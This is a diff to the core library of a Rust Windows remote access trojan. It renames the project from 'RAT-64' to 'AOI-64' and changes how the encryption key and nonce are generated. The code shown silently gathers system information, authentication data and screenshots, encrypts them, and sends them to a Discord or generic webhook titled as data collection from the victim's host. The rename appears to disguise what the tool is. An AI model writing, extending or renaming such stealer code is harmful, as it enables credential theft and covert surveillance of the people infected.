@@ -1,9 +1,9 @@
-// RAT-64 Library - 統合されたモジュール構造（整理済み）
+// AOI-64 Library - 統合されたモジュール構造（整理済み）
 use serde::{Deserialize, Serialize};
 
 // カスタムエラー型の定義
 #[derive(Debug)]
-pub enum RatError {
+pub enum AoiError {
     Io(std::io::Error),
     Serialization(serde_json::Error),
     Encryption(String),
@@ -11,33 +11,33 @@ pub enum RatError {
     Config(String),
 }
 
-impl std::fmt::Display for RatError {
+impl std::fmt::Display for AoiError {
     fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
         match self {
-            RatError::Io(err) => write!(f, "I/O error: {}", err),
-            RatError::Serialization(err) => write!(f, "Serialization error: {}", err),
-            RatError::Encryption(msg) => write!(f, "Encryption error: {}", msg),
-            RatError::Command(msg) => write!(f, "Command error: {}", msg),
-            RatError::Config(msg) => write!(f, "Configuration error: {}", msg),
+            AoiError::Io(err) => write!(f, "I/O error: {}", err),
+            AoiError::Serialization(err) => write!(f, "Serialization error: {}", err),
+            AoiError::Encryption(msg) => write!(f, "Encryption error: {}", msg),
+            AoiError::Command(msg) => write!(f, "Command error: {}", msg),
+            AoiError::Config(msg) => write!(f, "Configuration error: {}", msg),
         }
     }
 }
 
-impl std::error::Error for RatError {}
+impl std::error::Error for AoiError {}
 
-impl From<std::io::Error> for RatError {
+impl From<std::io::Error> for AoiError {
     fn from(err: std::io::Error) -> Self {
-        RatError::Io(err)
+        AoiError::Io(err)
     }
 }
 
-impl From<serde_json::Error> for RatError {
+impl From<serde_json::Error> for AoiError {
     fn from(err: serde_json::Error) -> Self {
-        RatError::Serialization(err)
+        AoiError::Serialization(err)
     }
 }
 
-pub type RatResult<T> = Result<T, RatError>;
+pub type AoiResult<T> = Result<T, AoiError>;
 
 // 整理されたモジュールシステム
 pub mod collectors;
@@ -82,7 +82,7 @@ pub use utils::{encrypt_data_with_key, generate_key_pair};
 
 // メイン実行機能
 #[cfg(windows)]
-pub async fn execute_rat_operations(config: &Config) -> RatResult<String> {
+pub async fn execute_aoi_operations(config: &Config) -> AoiResult<String> {
     // システム情報収集（サイレント）
     let _ = get_system_info_async().await;
 
@@ -114,7 +114,7 @@ pub struct IntegratedPayload {
 
 #[cfg(windows)]
 impl IntegratedPayload {
-    pub async fn create_with_config(config: &Config) -> RatResult<Self> {
+    pub async fn create_with_config(config: &Config) -> AoiResult<Self> {
         let system_info = get_system_info_async().await?;
         let auth_data = collect_auth_data_with_config(config);
         let screenshot_data = if config.collect_screenshots {
@@ -137,9 +137,8 @@ impl IntegratedPayload {
         // 暗号化キーとノンス生成（必須）
         let mut key = [0u8; 32];
         let mut nonce = [0u8; 12];
-        use rand::RngCore;
-        rand::rng().fill_bytes(&mut key);
-        rand::rng().fill_bytes(&mut nonce);
+        getrandom::getrandom(&mut key).expect("Failed to generate random key");
+        getrandom::getrandom(&mut nonce).expect("Failed to generate random nonce");
 
         Ok(IntegratedPayload {
             system_info,
@@ -171,7 +170,7 @@ impl IntegratedPayload {
 
 // Webhook送信（統合版）
 #[cfg(windows)]
-pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) -> AoiResult<()> {
     if !config.webhook_enabled {
         return Ok(());
     }
@@ -186,7 +185,7 @@ pub async fn send_unified_webhook(payload: &IntegratedPayload, config: &Config) 
 }
 
 #[cfg(windows)]
-async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> AoiResult<()> {
     use serde_json::json;
 
     let public_ip = payload.system_info.public_ip.as_deref().unwrap_or("不明");
@@ -199,7 +198,7 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
         .unwrap_or(0);
 
     let embed = json!({
-        "title": format!("🔥 RAT-64 データ収集 - {}", payload.system_info.hostname),
+        "title": format!("🔥 AOI-64 データ収集 - {}", payload.system_info.hostname),
         "color": 0x00ff00,
         "fields": [
             {
@@ -273,7 +272,7 @@ async fn send_discord_webhook(payload: &IntegratedPayload, config: &Config) -> R
 }
 
 #[cfg(windows)]
-async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> RatResult<()> {
+async fn send_generic_webhook(payload: &IntegratedPayload, config: &Config) -> AoiResult<()> {
     let body = serde_json::to_string(payload)?;
     send_json_webhook(
         &config.webhook_url,
@@ -289,7 +288,7 @@ async fn send_json_webhook(
     body: String,
     context: &str,
     timeout_seconds: u64,
-) -> RatResult<()> {
+) -> AoiResult<()> {
     let url_owned = url.to_owned();
     let context_owned = context.to_owned();
     let join_context = context_owned.clone();
@@ -304,14 +303,14 @@ async fn send_json_webhook(
         req.send()
     })
     .await
-    .map_err(|e| RatError::Command(format!("{} Webhook送信スレッドエラー: {}", join_context, e)))?;
+    .map_err(|e| AoiError::Command(format!("{} Webhook送信スレッドエラー: {}", join_context, e)))?;
 
     let request_context = context_owned.clone();
     let response = response_result
-        .map_err(|e| RatError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;
+        .map_err(|e| AoiError::Command(format!("{} Webhook送信エラー: {}", request_context, e)))?;
 
     if !(200..=299).contains(&response.status_code) {
-        return Err(RatError::Command(format!(
+        return Err(AoiError::Command(format!(
             "{} Webhook送信失敗: {}",
             context_owned, response.status_code
         )));
